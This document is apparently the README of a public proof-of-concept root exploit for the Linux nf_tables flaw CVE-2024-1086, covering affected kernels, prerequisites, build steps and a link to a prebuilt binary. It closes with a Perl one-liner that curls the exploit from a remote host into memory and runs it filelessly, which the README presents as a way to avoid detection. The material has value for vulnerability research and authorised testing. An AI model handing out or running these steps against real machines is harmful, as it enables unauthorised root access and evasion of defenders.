# CVE-2024-1086

Local privilege escalation Proof-of-Concept exploit for [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086), working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is typically around 99,4% to 93%. 

---

The only requirements are that user namespaces are enabled (kconfig `CONFIG_USER_NS=y`), those user namespaces are unprivileged (sh command `sysctl kernel.unprivileged_userns_clone` = 1), and nf_tables is enabled (kconfig `CONFIG_NF_TABLES=y`). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well.

**Note:**

- The exploit may be unstable on systems with a WiFi adapter, surrounded by high-usage WiFi networks. When testing, please turn off WiFi adapters through BIOS.


## Blogpost / Write-up

A full write-up of the exploit can be found in the blogpost: ["Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques"](https://pwning.tech/nftables/) @ pwning.tech


## Affected versions

The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149>, v6.1.76>, v6.6.15>.

The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.

The exploit does not work v6.4> kernels with kconfig `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (including Ubuntu v6.5)

## Usage

### Configuration

The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. 

On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in [`src/config.h`](/src/config.h).

If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle `CONFIG_REDIRECT_LOG` to `1` to avoid unnecessary network activity.

### Building

Binary: `CVE-2024-1086/exploit`

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

If this is impractical for you, there is an [compiled x64 binary](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) with the default config.

### Running

Running the exploit is just as trivial:

```bash
./exploit
```

Fileless execution is also supported, in case of pentest situations where detections need to be avoided.

Perl needs to be installed on the target:
```bash
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, ">&=".$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```
